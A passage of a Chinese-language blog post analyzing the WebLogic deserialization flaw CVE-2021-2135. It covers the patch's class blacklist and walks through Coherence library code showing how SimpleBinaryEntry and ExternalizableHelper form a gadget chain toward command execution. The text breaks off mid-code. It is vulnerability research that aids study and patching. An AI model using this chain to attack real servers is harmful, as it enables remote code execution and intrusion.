<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="文章首发于安全客：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;248770。 一、前言早在今年4月 Weblogic发布了安全公告，里面有一个编号是CVE-2021-2135的反序列化漏洞，因为工作原因需要构造该漏洞POC，当时拿到了安全补丁，但是奈何太菜并没有解出来。后来360CERT发布了分析文章，花了一周多的时间终于把POC构造出来了。现在把分析学习及POC构造中遇到的">
<meta property="og:type" content="article">
<meta property="og:title" content="WebLogic CVE-2021-2135分析及POC构造遇到的问题">
<meta property="og:url" content="https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/index.html">
<meta property="og:site_name" content="R17a&#39;s blog">
<meta property="og:description" content="文章首发于安全客：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;248770。 一、前言早在今年4月 Weblogic发布了安全公告，里面有一个编号是CVE-2021-2135的反序列化漏洞，因为工作原因需要构造该漏洞POC，当时拿到了安全补丁，但是奈何太菜并没有解出来。后来360CERT发布了分析文章，花了一周多的时间终于把POC构造出来了。现在把分析学习及POC构造中遇到的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://r17a-17.github.io/imgs/image-20210729204719132.png">
<meta property="article:published_time" content="2021-07-29T01:32:48.000Z">
<meta property="article:modified_time" content="2021-07-29T01:32:48.000Z">
<meta property="article:author" content="R17a">
<meta property="article:tag" content="CVE-2021-2135">
<meta property="article:tag" content="CVE-2020-14756">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://r17a-17.github.io/imgs/image-20210729204719132.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>WebLogic CVE-2021-2135分析及POC构造遇到的问题</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/08/06/RMI-LDAP-JNDI%E5%8F%8AJdbcRowSetImpl%E5%88%A9%E7%94%A8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&text=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&is_video=false&description=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WebLogic CVE-2021-2135分析及POC构造遇到的问题&body=Check out this article: https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&title=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&name=WebLogic CVE-2021-2135分析及POC构造遇到的问题&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://r17a-17.github.io/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/&t=WebLogic CVE-2021-2135分析及POC构造遇到的问题" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、前言"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、命令执行载体分析："><span class="toc-number">2.</span> <span class="toc-text">二、命令执行载体分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、SimpleBinaryEntry的特性"><span class="toc-number">2.1.</span> <span class="toc-text">1、SimpleBinaryEntry的特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、ExternalizableHelper-fromBinary"><span class="toc-number">2.2.</span> <span class="toc-text">2、ExternalizableHelper.fromBinary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、TopNAggregator-PartialResult-readExternal-到命令执行"><span class="toc-number">2.3.</span> <span class="toc-text">3、TopNAggregator.PartialResult.readExternal()到命令执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、反序列化载体分析："><span class="toc-number">3.</span> <span class="toc-text">三、反序列化载体分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、SimpleBinaryEntry-toString-的触发"><span class="toc-number">3.1.</span> <span class="toc-text">1、SimpleBinaryEntry.toString()的触发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、反序列化入口"><span class="toc-number">3.2.</span> <span class="toc-text">2、反序列化入口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、POC构造遇到的三个问题"><span class="toc-number">4.</span> <span class="toc-text">四、POC构造遇到的三个问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、SimpleBinaryEntry-m-binKey的构造问题"><span class="toc-number">4.1.</span> <span class="toc-text">1、SimpleBinaryEntry.m_binKey的构造问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、不设置SimpleBinaryEntry-m-serializer导致序列化失败"><span class="toc-number">4.2.</span> <span class="toc-text">2、不设置SimpleBinaryEntry.m_serializer导致序列化失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、ClassCastException报错问题"><span class="toc-number">4.3.</span> <span class="toc-text">3、ClassCastException报错问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-number">5.</span> <span class="toc-text">参考链接：</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        WebLogic CVE-2021-2135分析及POC构造遇到的问题
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">R17a</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-07-29T01:32:48.000Z" itemprop="datePublished">2021-07-29</time>
        
        (Updated: <time datetime="2021-07-29T01:32:48.000Z" itemprop="dateModified">2021-07-29</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/%E5%BA%8F%E5%88%97%E5%8C%96/">序列化</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CVE-2020-14756/" rel="tag">CVE-2020-14756</a>, <a class="tag-link" href="/tags/CVE-2021-2135/" rel="tag">CVE-2021-2135</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>文章首发于安全客：<a href="https://www.anquanke.com/post/id/248770。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/248770。</a></p>
<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>早在今年4月 Weblogic发布了安全公告，里面有一个编号是CVE-2021-2135的反序列化漏洞，因为工作原因需要构造该漏洞POC，当时拿到了安全补丁，但是奈何太菜并没有解出来。后来360CERT发布了分析文章，花了一周多的时间终于把POC构造出来了。现在把分析学习及POC构造中遇到的问题记录下来。</p>
<p>4月与1月补丁<code>WebLogicFilterConfig.class</code>diff后如下，将<code>com.tangosol.internal.util.SimpleBinaryEntry</code>加入了黑名单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static final String[] DEFAULT_BLACKLIST_CLASSES &#x3D; new String[]&#123;&quot;oracle.jdbc.pool.OraclePooledConnection&quot;&#125;;</span><br><span class="line"></span><br><span class="line">private static final String[] DEFAULT_WLS_ONLY_BLACKLIST_CLASSES &#x3D; new String[]&#123;&quot;com.tangosol.internal.util.SimpleBinaryEntry&quot;&#125;;</span><br></pre></td></tr></table></figure>

<p>根据补丁反向推漏洞的话主要两部分命令执行载体和反序列化载体，命令执行载体达到我们执行命令的目的，反序列化载体从反序列化从入口到命令执行载体入口的动态执行，我们先分别来分析下。</p>
<h3 id="二、命令执行载体分析："><a href="#二、命令执行载体分析：" class="headerlink" title="二、命令执行载体分析："></a>二、命令执行载体分析：</h3><p>既然我们已经知道<code>com.tangosol.internal.util.SimpleBinaryEntry</code>在黑名单里，那么我们来分析下<code>com.tangosol.internal.util.SimpleBinaryEntry</code>的特性</p>
<h4 id="1、SimpleBinaryEntry的特性"><a href="#1、SimpleBinaryEntry的特性" class="headerlink" title="1、SimpleBinaryEntry的特性"></a>1、SimpleBinaryEntry的特性</h4><p><code>SimpleBinaryEntry</code>实现了<code>SerializerAware</code>、<code>ExternalizableLite</code>、<code>PortableObject</code>，<code>ExternalizableLite</code>用来处理序列化相关数据。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleBinaryEntry</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span></span><br><span class="line"><span class="class">	<span class="keyword">implements</span> <span class="title">Entry</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt;, <span class="title">SerializerAware</span>, <span class="title">ExternalizableLite</span>, <span class="title">PortableObject</span></span></span><br></pre></td></tr></table></figure>

<p><code>SimpleBinaryEntry</code>有2个可序列化属性和3个不可序列化属性，其中<code>m_binKey</code>和<code>m_binValue</code>是二进制类型。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonbProperty</span>(<span class="string">"binKey"</span>)</span><br><span class="line"><span class="keyword">protected</span> Binary m_binKey; <span class="comment">//二进制key，JsonbProperty作用是把该属性的名称序列化为另外一个名称，如把m_binKey属性序列化为binKey</span></span><br><span class="line"><span class="meta">@JsonbProperty</span>(<span class="string">"binValue"</span>)</span><br><span class="line"><span class="keyword">protected</span> Binary m_binValue; <span class="comment">//二进制value</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">transient</span> Serializer m_serializer;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">transient</span> K m_key;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">transient</span> V m_value;</span><br></pre></td></tr></table></figure>

<p><code>SimpleBinaryEntry</code>有参构造方法通过传参<code>BinaryEntry</code>或者key和value给属性<code>m_binKey</code>和<code>m_binValue</code>赋值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">SimpleBinaryEntry</span><span class="params">(Binary binKey, Binary binValue)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.m_binKey = binKey;</span><br><span class="line">    <span class="keyword">this</span>.m_binValue = binValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>SimpleBinaryEntry</code>借助<code>m_serializer</code>通过<code>getKey</code>和<code>getValue</code>方法处理另外两个属性<code>m_key</code>和<code>m_value</code>。当其没有被赋值，会调用<code>ExternalizableHelper.fromBinary</code>来处理并返回结果，这时候的<code>m_key</code>和<code>m_value</code>处理后可以是指定类型的实例，而这也是漏洞的关键之处，我们可以通过构造将<code>m_key</code>或<code>m_value</code>转为我们想要的对象。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> K <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    K key = <span class="keyword">this</span>.m_key;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回的是ExternalizableHelper.fromBinary(this.m_binKey,this.m_serializer)的结果</span></span><br><span class="line">        key = <span class="keyword">this</span>.m_key = ExternalizableHelper.fromBinary(<span class="keyword">this</span>.m_binKey, <span class="keyword">this</span>.getContextSerializer());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    V value = <span class="keyword">this</span>.m_value;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回的是ExternalizableHelper.fromBinary的结果</span></span><br><span class="line">        value = <span class="keyword">this</span>.m_value = ExternalizableHelper.fromBinary(<span class="keyword">this</span>.m_binValue, <span class="keyword">this</span>.getContextSerializer());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SimpleBinaryEntry重写了toString方法，我们可以通过该方法调用getKey。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"SimpleBinaryEntry(key=\""</span> + <span class="keyword">this</span>.getKey() + <span class="string">"\", value=\""</span> + <span class="keyword">this</span>.getValue() + <span class="string">"\")"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来看下<code>ExternalizableHelper.fromBinary</code>。</p>
<h4 id="2、ExternalizableHelper-fromBinary"><a href="#2、ExternalizableHelper-fromBinary" class="headerlink" title="2、ExternalizableHelper.fromBinary"></a>2、<code>ExternalizableHelper.fromBinary</code></h4><p><code>ExternalizableHelper.fromBinary</code>最终会调用<code>ExternalizableHelper.deserializeInternal</code>处理，<code>deserializeInternal</code>方法如下，当<code>nType!=21</code>时调用<code>ExternalizableHelper.readObjectInternal</code>读取对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// serializer可以是SimpleBinaryEntry.this.m_serializer，buf可以是SimpleBinaryEntry.m_binKey或m_binValue</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">deserializeInternal</span><span class="params">(Serializer serializer, ReadBuffer buf, Function&lt;BufferInput, BufferInput&gt; supplierBufferIn, Class&lt;T&gt; clazz)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    BufferInput in = buf.getBufferInput();</span><br><span class="line">    <span class="keyword">int</span> nType = in.readUnsignedByte();</span><br><span class="line">    <span class="keyword">switch</span>(nType) &#123;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (supplierBufferIn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        in = (BufferInput)supplierBufferIn.apply(in);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// nType!=21，调用ExternalizableHelper.readObjectInternal</span></span><br><span class="line">    Object o = nType == <span class="number">21</span> ? serializer.deserialize(in, clazz) : readObjectInternal(in, nType, ((ClassLoaderAware)serializer).getContextClassLoader());</span><br><span class="line">    <span class="keyword">return</span> realize(o, serializer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ExternalizableHelper.readObjectInternal</code>会按照<code>nType</code>的值进行处理，根据<code>ExternalizableHelper.writeObjectnType</code>，在序列化时通过<code>getStreamFormat</code>进行赋值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getStreamFormat:o instanceof ExternalizableLite ? 10，当对象是ExternalizableLite实例，nType=10</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getStreamFormat</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> o == <span class="keyword">null</span> ? <span class="number">0</span> : (o <span class="keyword">instanceof</span> String ? <span class="number">6</span> : (o <span class="keyword">instanceof</span> Number ? (o <span class="keyword">instanceof</span> Integer ? <span class="number">1</span> : (o <span class="keyword">instanceof</span> Long ? <span class="number">2</span> : (o <span class="keyword">instanceof</span> Double ? <span class="number">3</span> : (o <span class="keyword">instanceof</span> BigInteger ? <span class="number">4</span> : (o <span class="keyword">instanceof</span> BigDecimal ? <span class="number">5</span> : (o <span class="keyword">instanceof</span> Float ? <span class="number">14</span> : (o <span class="keyword">instanceof</span> Short ? <span class="number">15</span> : (o <span class="keyword">instanceof</span> Byte ? <span class="number">16</span> : <span class="number">11</span>)))))))) : (o <span class="keyword">instanceof</span> <span class="keyword">byte</span>[] ? <span class="number">8</span> : (o <span class="keyword">instanceof</span> ReadBuffer ? <span class="number">7</span> : (o <span class="keyword">instanceof</span> XmlBean ? <span class="number">12</span> : (o <span class="keyword">instanceof</span> ExternalizableHelper.IntDecoratedObject ? <span class="number">13</span> : (o <span class="keyword">instanceof</span> ExternalizableLite ? <span class="number">10</span> : (o <span class="keyword">instanceof</span> Boolean ? <span class="number">17</span> : (o <span class="keyword">instanceof</span> Serializable ? <span class="number">11</span> : (o <span class="keyword">instanceof</span> Optional ? <span class="number">22</span> : (o <span class="keyword">instanceof</span> OptionalInt ? <span class="number">23</span> : (o <span class="keyword">instanceof</span> OptionalLong ? <span class="number">24</span> : (o <span class="keyword">instanceof</span> OptionalDouble ? <span class="number">25</span> : (o <span class="keyword">instanceof</span> XmlSerializable ? <span class="number">9</span> : <span class="number">255</span>))))))))))))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ExternalizableHelper.readObjectInternal</code>代码如下，根据<strong>序列化数据的类型<code>nType</code></strong>进行反序列化读取对象，当nType=10，调用readExternalizableLite。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">readObjectInternal</span><span class="params">(DataInput in, <span class="keyword">int</span> nType, ClassLoader loader)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(nType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> readInt(in);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> readLong(in);</span><br><span class="line">	......</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        Binary bin = <span class="keyword">new</span> Binary(); <span class="comment">//调用Binary.readExternal反序列化读取</span></span><br><span class="line">        bin.readExternal(in);</span><br><span class="line">        <span class="keyword">return</span> bin;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> readExternalizableLite(in, loader); <span class="comment">// 当nType=10，调用readExternalizableLite</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> readSerializable(in, loader);</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">case</span> <span class="number">255</span>:</span><br><span class="line">        <span class="keyword">return</span> readSerializable(in, loader);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(<span class="string">"invalid type: "</span> + nType);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>ExternalizableHelper.readExternalizableLite</code>中，会实例化类为value，并且会调用value所属类的readExternal方法来读取最终的对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExternalizableLite <span class="title">readExternalizableLite</span><span class="params">(DataInput in, ClassLoader loader)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ExternalizableLite value;</span><br><span class="line">    <span class="keyword">if</span> (in <span class="keyword">instanceof</span> PofInputStream) &#123;</span><br><span class="line">        value = (ExternalizableLite)((PofInputStream)in).readObject();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String sClass = readUTF((DataInput)in); <span class="comment">// 获取类名</span></span><br><span class="line">        WrapperDataInputStream inWrapper = in <span class="keyword">instanceof</span> WrapperDataInputStream ? (WrapperDataInputStream)in : <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 加载并实例化序列化时写入的类名</span></span><br><span class="line">            value = (ExternalizableLite)loadClass(sClass, loader, inWrapper == <span class="keyword">null</span> ? <span class="keyword">null</span> : inWrapper.getClassLoader()).newInstance();</span><br><span class="line">			......</span><br><span class="line">		<span class="comment">// 调用value的readExternal方法读取对象</span></span><br><span class="line">        value.readExternal((DataInput)in);</span><br><span class="line">        <span class="comment">// !!注意这里 当value是SerializerAware的实例，会设置它的Serializer</span></span><br><span class="line">        <span class="keyword">if</span> (value <span 